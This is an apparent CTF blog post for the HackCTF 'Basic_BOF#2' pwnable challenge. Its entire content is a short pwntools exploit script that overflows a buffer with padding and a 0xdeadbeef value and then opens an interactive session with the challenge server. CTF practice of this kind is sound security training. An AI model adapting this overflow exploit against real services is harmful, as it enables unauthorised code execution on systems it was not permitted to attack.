---
title: "[HackCTF] Basic_BOF#2"
date: 2020-06-30
ctf: HackCTF
tag: [pwnable]
layout: post
---

{% highlight python %}from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3000)

p.sendline("0"*0x28+p32(0xdeadbeef)) p.interactive(){% endhighlight %}
